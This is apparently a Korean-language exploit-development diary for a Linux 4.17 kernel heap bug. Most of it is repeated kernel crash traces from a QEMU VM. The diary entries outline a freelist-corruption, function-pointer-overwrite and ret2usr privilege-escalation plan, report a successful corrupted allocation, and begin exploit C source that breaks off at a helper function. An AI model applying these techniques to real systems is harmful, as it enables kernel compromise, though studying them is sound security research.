[   46.438150] RDX: 0000000000004000 RSI: 00007ffc9ba5ad30 RDI: 0000000000000005
[   46.438150] RBP: 00007ffc9ba5ad70 R08: 000000000000c100 R09: 00000000000000a2
[   46.438150] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b7a0
[   46.438150] R13: 00007ffc9ba5adb0 R14: 00007ffc9ba5b6e0 R15: 00007ffc9ba5b720
[   46.438150] Code: 8b 47 20 49 8b 3f 48 8d 4a 01 48 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73 ff ff ff 48 85 db 74 0b 41 8b 47 20 <48> 8b 04 03 0f 18 08 41 f7 c4 00 80 00 00 75 b4 66 66 66 66 90
[   46.438150] RIP: __kmalloc_node_track_caller+0xfe/0x230 RSP: ffffc900004bfae0
[   46.456055] ---[ end trace 0d14a1a0336d2121 ]---
[   46.486195] systemd-udevd (1673) used greatest stack depth: 13376 bytes left
[   46.489019] general protection fault: 0000 [#2] SMP NOPTI
[   46.489022] Modules linked in:
[   46.489022] CPU: 0 PID: 1109 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.489022] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.489022] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.489022] RSP: 0018:ffffc900003f7ae0 EFLAGS: 00000246
[   46.489022] RAX: 0000000000000000 RBX: ffff88007ba8ac00 RCX: 0000000000000ce7
[   46.489022] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.489022] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.489022] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.489022] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.489022] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.489022] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.489022] CR2: 00007f907828b2e0 CR3: 000000007bb3a000 CR4: 00000000000006f0
[   46.489022] Call Trace:
[   46.489022]  ? __alloc_skb+0x7d/0x1d0
[   46.489022]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.489022]  __alloc_skb+0x7d/0x1d0
[   46.489022]  alloc_skb_with_frags+0x5f/0x1b0
[   46.489022]  ? wait_woken+0x80/0x80
[   46.489022]  sock_alloc_send_pskb+0x1f8/0x230
[   46.489022]  ? _cond_resched+0x10/0x40
[   46.489022]  ? wait_for_unix_gc+0x2f/0xa0
[   46.489022]  unix_dgram_sendmsg+0x132/0x6e0
[   46.489022]  sock_sendmsg+0x31/0x40
[   46.489022]  ___sys_sendmsg+0x26a/0x2c0
[   46.489022]  ? seccomp_run_filters+0x54/0xb0
[   46.489022]  ? __seccomp_filter+0x3e/0x570
[   46.489022]  ? do_wp_page+0x114/0x470
[   46.489022]  ? __handle_mm_fault+0x253/0xa10
[   46.489022]  ? __sys_sendmsg+0x59/0xa0
[   46.489022]  __sys_sendmsg+0x59/0xa0
[   46.489022]  do_syscall_64+0x49/0x100
[   46.489022]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.489022] RIP: 0033:0x7f9078083e67
[   46.489022] RSP: 002b:00007ffc9ba5b488 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.489022] RAX: ffffffffffffffda RBX: 00007ffc9ba5b490 RCX: 00007f9078083e67
[   46.489022] RDX: 0000000000004000 RSI: 00007ffc9ba5b490 RDI: 0000000000000005
[   46.489022] RBP: 00007ffc9ba5b4d0 R08: 0000000000000000 R09: 0000000000000083
[   46.489022] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5bf00
[   46.489022] R13: 00007ffc9ba5b510 R14: 00007ffc9ba5be40 R15: 00007ffc9ba5be80
[   46.489022] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.489022] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc900003f7ae0
[   46.499029] ---[ end trace 0d14a1a0336d2122 ]---
[   46.516096] general protection fault: 0000 [#3] SMP NOPTI
[   46.516096] Modules linked in:
[   46.516096] CPU: 0 PID: 1349 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.516096] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.516096] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.516096] RSP: 0018:ffffc90000a37ae0 EFLAGS: 00000246
[   46.516096] RAX: 0000000000000000 RBX: ffff88007ba8a600 RCX: 0000000000000ce7
[   46.516096] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.516096] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.516096] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.516096] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.516096] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.516096] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.516096] CR2: 00007f89db34a228 CR3: 000000007ba84000 CR4: 00000000000006f0
[   46.516096] Call Trace:
[   46.516096]  ? __alloc_skb+0x7d/0x1d0
[   46.516096]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.516096]  __alloc_skb+0x7d/0x1d0
[   46.516096]  alloc_skb_with_frags+0x5f/0x1b0
[   46.516096]  ? wait_woken+0x80/0x80
[   46.516096]  sock_alloc_send_pskb+0x1f8/0x230
[   46.516096]  ? _cond_resched+0x10/0x40
[   46.516096]  ? wait_for_unix_gc+0x2f/0xa0
[   46.516096]  unix_dgram_sendmsg+0x132/0x6e0
[   46.516096]  sock_sendmsg+0x31/0x40
[   46.516096]  ___sys_sendmsg+0x26a/0x2c0
[   46.516096]  ? seccomp_run_filters+0x54/0xb0
[   46.516096]  ? __slab_free+0x146/0x300
[   46.516096]  ? arch_tlb_finish_mmu+0x50/0x70
[   46.516096]  ? __seccomp_filter+0x3e/0x570
[   46.516096]  ? kmem_cache_free+0x143/0x160
[   46.516096]  ? __sys_sendmsg+0x59/0xa0
[   46.516096]  __sys_sendmsg+0x59/0xa0
[   46.516096]  do_syscall_64+0x49/0x100
[   46.516096]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.516096] RIP: 0033:0x7f9078083e67
[   46.516096] RSP: 002b:00007ffc9ba5ade8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.516096] RAX: ffffffffffffffda RBX: 00007ffc9ba5adf0 RCX: 00007f9078083e67
[   46.516096] RDX: 0000000000004000 RSI: 00007ffc9ba5adf0 RDI: 0000000000000005
[   46.516096] RBP: 00007ffc9ba5ae30 R08: 000000000000f1d0 R09: 00000000000000a8
[   46.516096] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b860
[   46.516096] R13: 00007ffc9ba5ae70 R14: 00007ffc9ba5b7a0 R15: 00007ffc9ba5b7e0
[   46.516096] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.516096] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc90000a37ae0
[   46.525841] ---[ end trace 0d14a1a0336d2123 ]---
[   46.532408] general protection fault: 0000 [#4] SMP NOPTI
[   46.532408] Modules linked in:
[   46.532408] CPU: 0 PID: 1352 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.532408] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.532408] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.532408] RSP: 0018:ffffc90000a4fae0 EFLAGS: 00000246
[   46.532408] RAX: 0000000000000000 RBX: ffff88007ba8a300 RCX: 0000000000000ce7
[   46.532408] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.532408] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.532408] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.532408] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.532408] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.532408] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.532408] CR2: 00007f907806f740 CR3: 000000007b698000 CR4: 00000000000006f0
[   46.532408] Call Trace:
[   46.532408]  ? __alloc_skb+0x7d/0x1d0
[   46.532408]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.532408]  __alloc_skb+0x7d/0x1d0
[   46.532408]  alloc_skb_with_frags+0x5f/0x1b0
[   46.532408]  ? wait_woken+0x80/0x80
[   46.532408]  sock_alloc_send_pskb+0x1f8/0x230
[   46.532408]  ? _cond_resched+0x10/0x40
[   46.532408]  ? wait_for_unix_gc+0x2f/0xa0
[   46.532408]  unix_dgram_sendmsg+0x132/0x6e0
[   46.532408]  sock_sendmsg+0x31/0x40
[   46.532408]  ___sys_sendmsg+0x26a/0x2c0
[   46.532408]  ? seccomp_run_filters+0x54/0xb0
[   46.532408]  ? __slab_free+0x146/0x300
[   46.532408]  ? arch_tlb_finish_mmu+0x50/0x70
[   46.532408]  ? __seccomp_filter+0x3e/0x570
[   46.532408]  ? do_wp_page+0x114/0x470
[   46.532408]  ? __handle_mm_fault+0x253/0xa10
[   46.532408]  ? __sys_sendmsg+0x59/0xa0
[   46.532408]  __sys_sendmsg+0x59/0xa0
[   46.532408]  do_syscall_64+0x49/0x100
[   46.532408]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.532408] RIP: 0033:0x7f9078083e67
[   46.532408] RSP: 002b:00007ffc9ba5ad38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.532408] RAX: ffffffffffffffda RBX: 00007ffc9ba5ad40 RCX: 00007f9078083e67
[   46.532408] RDX: 0000000000004000 RSI: 00007ffc9ba5ad40 RDI: 0000000000000005
[   46.532408] RBP: 00007ffc9ba5ad80 R08: 000000000000f1d0 R09: 00000000000000a8
[   46.532408] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b7b0
[   46.532408] R13: 00007ffc9ba5adc0 R14: 00007ffc9ba5b6f0 R15: 00007ffc9ba5b730
[   46.532408] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.532408] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc90000a4fae0
[   46.545088] ---[ end trace 0d14a1a0336d2124 ]---
[   46.546015] general protection fault: 0000 [#5] SMP NOPTI
[   46.546022] Modules linked in:
[   46.546022] CPU: 0 PID: 1353 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.546022] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.546022] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.546022] RSP: 0018:ffffc90000a57ae0 EFLAGS: 00000246
[   46.546022] RAX: 0000000000000000 RBX: ffff88007ba8a700 RCX: 0000000000000ce7
[   46.546022] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.546022] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.546022] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.546022] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.546022] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.546022] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.546022] CR2: 00007f907806f740 CR3: 000000007b6b8000 CR4: 00000000000006f0
[   46.546022] Call Trace:
[   46.546022]  ? __alloc_skb+0x7d/0x1d0
[   46.546022]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.546022]  __alloc_skb+0x7d/0x1d0
[   46.546022]  alloc_skb_with_frags+0x5f/0x1b0
[   46.546022]  ? wait_woken+0x80/0x80
[   46.546022]  sock_alloc_send_pskb+0x1f8/0x230
[   46.546022]  ? _cond_resched+0x10/0x40
[   46.546022]  ? wait_for_unix_gc+0x2f/0xa0
[   46.546022]  unix_dgram_sendmsg+0x132/0x6e0
[   46.546022]  sock_sendmsg+0x31/0x40
[   46.546022]  ___sys_sendmsg+0x26a/0x2c0
[   46.546022]  ? seccomp_run_filters+0x54/0xb0
[   46.546022]  ? __slab_free+0x146/0x300
[   46.546022]  ? arch_tlb_finish_mmu+0x50/0x70
[   46.546022]  ? __seccomp_filter+0x3e/0x570
[   46.546022]  ? kmem_cache_free+0x143/0x160
[   46.546022]  ? __sys_sendmsg+0x59/0xa0
[   46.546022]  __sys_sendmsg+0x59/0xa0
[   46.546022]  do_syscall_64+0x49/0x100
[   46.546022]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.546022] RIP: 0033:0x7f9078083e67
[   46.546022] RSP: 002b:00007ffc9ba5ad38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.546022] RAX: ffffffffffffffda RBX: 00007ffc9ba5ad40 RCX: 00007f9078083e67
[   46.546022] RDX: 0000000000004000 RSI: 00007ffc9ba5ad40 RDI: 0000000000000005
[   46.546022] RBP: 00007ffc9ba5ad80 R08: 000000000000f1d0 R09: 00000000000000a8
[   46.546022] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b7b0
[   46.546022] R13: 00007ffc9ba5adc0 R14: 00007ffc9ba5b6f0 R15: 00007ffc9ba5b730
[   46.546022] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.546022] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc90000a57ae0
[   46.557297] ---[ end trace 0d14a1a0336d2125 ]---
[   46.558199] general protection fault: 0000 [#6] SMP NOPTI
[   46.558199] Modules linked in:
[   46.558199] CPU: 0 PID: 1356 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.558199] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.558199] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.558199] RSP: 0018:ffffc90000a6fae0 EFLAGS: 00000246
[   46.558199] RAX: 0000000000000000 RBX: ffff88007ab0e900 RCX: 0000000000000ce7
[   46.558199] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.558199] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.558199] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.558199] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.558199] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.558199] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.558199] CR2: 00007f907806f740 CR3: 000000007b726000 CR4: 00000000000006f0
[   46.558199] Call Trace:
[   46.558199]  ? __alloc_skb+0x7d/0x1d0
[   46.558199]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.558199]  __alloc_skb+0x7d/0x1d0
[   46.558199]  alloc_skb_with_frags+0x5f/0x1b0
[   46.558199]  ? wait_woken+0x80/0x80
[   46.558199]  sock_alloc_send_pskb+0x1f8/0x230
[   46.558199]  ? _cond_resched+0x10/0x40
[   46.558199]  ? wait_for_unix_gc+0x2f/0xa0
[   46.558199]  unix_dgram_sendmsg+0x132/0x6e0
[   46.558199]  sock_sendmsg+0x31/0x40
[   46.558199]  ___sys_sendmsg+0x26a/0x2c0
[   46.558199]  ? seccomp_run_filters+0x54/0xb0
[   46.558199]  ? __slab_free+0x146/0x300
[   46.558199]  ? arch_tlb_finish_mmu+0x50/0x70
[   46.558199]  ? __seccomp_filter+0x3e/0x570
[   46.558199]  ? kmem_cache_free+0x143/0x160
[   46.558199]  ? __sys_sendmsg+0x59/0xa0
[   46.558199]  __sys_sendmsg+0x59/0xa0
[   46.558199]  do_syscall_64+0x49/0x100
[   46.558199]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.558199] RIP: 0033:0x7f9078083e67
[   46.558199] RSP: 002b:00007ffc9ba5ade8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.558199] RAX: ffffffffffffffda RBX: 00007ffc9ba5adf0 RCX: 00007f9078083e67
[   46.558199] RDX: 0000000000004000 RSI: 00007ffc9ba5adf0 RDI: 0000000000000005
[   46.558199] RBP: 00007ffc9ba5ae30 R08: 000000000000f1d0 R09: 00000000000000a8
[   46.558199] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b860
[   46.558199] R13: 00007ffc9ba5ae70 R14: 00007ffc9ba5b7a0 R15: 00007ffc9ba5b7e0
[   46.558199] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.558199] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc90000a6fae0
[   46.571990] ---[ end trace 0d14a1a0336d2126 ]---
[   46.573958] general protection fault: 0000 [#7] SMP NOPTI
[   46.574642] Modules linked in:
[   46.574642] CPU: 0 PID: 1350 Comm: systemd-udevd Tainted: G      D           4.17.0 #7
[   46.574642] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.574642] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.574642] RSP: 0018:ffffc90000a3fae0 EFLAGS: 00000246
[   46.574642] RAX: 0000000000000000 RBX: ffff88007ab0ef00 RCX: 0000000000000ce7
[   46.574642] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.574642] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.574642] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.574642] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.574642] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.574642] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.574642] CR2: 00007f907806f740 CR3: 000000007b912000 CR4: 00000000000006f0
[   46.574642] Call Trace:
[   46.574642]  ? __alloc_skb+0x7d/0x1d0
[   46.574642]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.574642]  __alloc_skb+0x7d/0x1d0
[   46.574642]  alloc_skb_with_frags+0x5f/0x1b0
[   46.574642]  ? wait_woken+0x80/0x80
[   46.574642]  sock_alloc_send_pskb+0x1f8/0x230
[   46.574642]  ? _cond_resched+0x10/0x40
[   46.574642]  ? wait_for_unix_gc+0x2f/0xa0
[   46.574642]  unix_dgram_sendmsg+0x132/0x6e0
[   46.574642]  sock_sendmsg+0x31/0x40
[   46.574642]  ___sys_sendmsg+0x26a/0x2c0
[   46.574642]  ? seccomp_run_filters+0x54/0xb0
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __seccomp_filter+0x3e/0x570
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to_asm+0x40/0x70
[   46.574642]  ? __switch_to_asm+0x34/0x70
[   46.574642]  ? __switch_to+0x129/0x440
[   46.574642]  ? __sys_sendmsg+0x59/0xa0
[   46.574642]  __sys_sendmsg+0x59/0xa0
[   46.574642]  do_syscall_64+0x49/0x100
[   46.574642]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.574642] RIP: 0033:0x7f9078083e67
[   46.574642] RSP: 002b:00007ffc9ba5ade8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.574642] RAX: ffffffffffffffda RBX: 00007ffc9ba5adf0 RCX: 00007f9078083e67
[   46.574642] RDX: 0000000000004000 RSI: 00007ffc9ba5adf0 RDI: 0000000000000005
[   46.574642] RBP: 00007ffc9ba5ae30 R08: 000000000000f1d0 R09: 00000000000000a8
[   46.574642] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffc9ba5b860
[   46.574642] R13: 00007ffc9ba5ae70 R14: 00007ffc9ba5b7a0 R15: 00007ffc9ba5b7e0
[   46.574642] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.574642] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc90000a3fae0
[   46.588023] ---[ end trace 0d14a1a0336d2127 ]---
[   46.667449] general protection fault: 0000 [#8] SMP NOPTI
[   46.667449] Modules linked in:
[   46.667449] CPU: 0 PID: 1 Comm: systemd Tainted: G      D           4.17.0 #7
[   46.667449] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.667449] RIP: 0010:__kmalloc_node_track_caller+0xdd/0x230
[   46.667449] RSP: 0018:ffffc9000031fae0 EFLAGS: 00000246
[   46.667449] RAX: 0000000000000000 RBX: ffff88007ab0ed00 RCX: 0000000000000ce7
[   46.667449] RDX: 0000000000000ce6 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.667449] RBP: cafebabedeadbeef R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.667449] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.667449] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.667449] FS:  00007f38481aa500(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.667449] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.667449] CR2: 00007f89db5e4ef0 CR3: 000000007ba58000 CR4: 00000000000006f0
[   46.667449] Call Trace:
[   46.667449]  ? __alloc_skb+0x7d/0x1d0
[   46.667449]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.667449]  __alloc_skb+0x7d/0x1d0
[   46.667449]  alloc_skb_with_frags+0x5f/0x1b0
[   46.667449]  ? wait_woken+0x80/0x80
[   46.667449]  sock_alloc_send_pskb+0x1f8/0x230
[   46.667449]  ? _cond_resched+0x10/0x40
[   46.667449]  ? kmem_cache_alloc+0x164/0x170
[   46.667449]  ? _cond_resched+0x10/0x40
[   46.667449]  ? wait_for_unix_gc+0x2f/0xa0
[   46.667449]  unix_dgram_sendmsg+0x132/0x6e0
[   46.667449]  sock_sendmsg+0x31/0x40
[   46.667449]  ___sys_sendmsg+0x26a/0x2c0
[   46.667449]  ? comm_show+0x42/0x80
[   46.667449]  ? _copy_to_user+0x22/0x30
[   46.667449]  ? seq_read+0x1d3/0x450
[   46.667449]  ? __sys_sendmsg+0x59/0xa0
[   46.667449]  __sys_sendmsg+0x59/0xa0
[   46.667449]  do_syscall_64+0x49/0x100
[   46.667449]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.667449] RIP: 0033:0x7f3846a49e67
[   46.667449] RSP: 002b:00007fff947a57e8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.667449] RAX: ffffffffffffffda RBX: 00007fff947a5800 RCX: 00007f3846a49e67
[   46.667449] RDX: 0000000000004000 RSI: 00007fff947a5800 RDI: 0000000000000025
[   46.667449] RBP: 00007fff947a60c0 R08: 0000000000000000 R09: 000000000000008d
[   46.667449] R10: 0000000000000073 R11: 0000000000000246 R12: 00007fff947a5880
[   46.667449] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[   46.667449] Code: 00 00 48 89 c5 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 b0 3c a1 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73
[   46.667449] RIP: __kmalloc_node_track_caller+0xdd/0x230 RSP: ffffc9000031fae0
[   46.675533] ---[ end trace 0d14a1a0336d2128 ]---
[   46.707748] systemd: 747 output lines suppressed due to ratelimiting
[   46.709707] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
[   46.709707]
[   46.710305] Kernel Offset: disabled
[   46.710305] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
[   46.710305]  ]---
 ```

</details>


## 10/11

### 09:34
`userfaultfd: Function not implemented`의 원인을 찾아보다가 컴파일 한 리눅스 소스코드 폴더의 `arch/x86/entry/syscalls/syscall_64.tbl` 파일을 찾아 확인해봤다.

```sh
323 common  userfaultfd     __x64_sys_userfaultfd
```

`323`번 syscall인 `userfaultfd`가 `__x64_sys_userfaultfd` 함수로 연결되어 있다.
하지만 `userfaultfd` syscall을 호출했을 때 `userfaultfd: Function not implemented`라는 에러가 반환되기 때문에 gdb로 `__x64_sys_userfaultfd` 함수를 확인해봤다.

```sh
gef➤  disassemble __x64_sys_userfaultfd
Dump of assembler code for function sys_ni_syscall:
   0xffffffff8107da60 <+0>:	mov    rax,0xffffffffffffffda
   0xffffffff8107da67 <+7>:	ret
End of assembler dump.
gef➤
```

?????
왜 함수 body가 없지..?


### 10:54
계속 찾아보다가 자료가 진짜 안나와서 그냥 커널을 새로 빌드해야겠다고 생각해서 config파일 다 날리고 다시 만들다가  menuconfig의 `General setup / Enable userfaultfd() systemm call` 부분이 있어서 체크했다.
기존에 컴파일 할 때 체크했던 부분들(with debuginfo, Filesystem support, etc..)을 체크 후 추가로 디버그 편의성을 위해 `Disable heap randomize`도 체크했다.


### 17:16
만약 KASLR을 끈 상태로 힙 영역을 안다고 가정한다면,
1. freelist ptr을 스프레잉한 임의의 객체 주소로 변경(ex, struct socket이 할당된 주소)
2. sendmsg 함수를 통해 allocate
3. 2048Byte 청크와 1024Byte 청크가 겹쳐있는 모양으로 할당됨
4. allocate 되며 value copy가 일어나므로 함수 포인터를 덮게 됨
5. 해당 함수 호출을 통한 ret2usr


## 10/12

alloc_msg 함수 내에서 kmalloc 부터 sys_sendmsg까지 사이즈 어떻게 들어가는지 확인

### 16:14

freelist corrupt 후 해당 주소로 allocate가 가능해졌다.

```c
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/falloc.h>
#include <linux/loop.h>

#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>

#include <linux/userfaultfd.h>

#include <arpa/inet.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/wait.h>


#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define _mmap(addr, length, prot, flags, fd, offset) syscall(__NR_mmap, addr, length, prot, flags, fd, offset)

#define BASE 0x01000000
#define SIZE 0x10000
#define BUF_SIZE 0x300

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
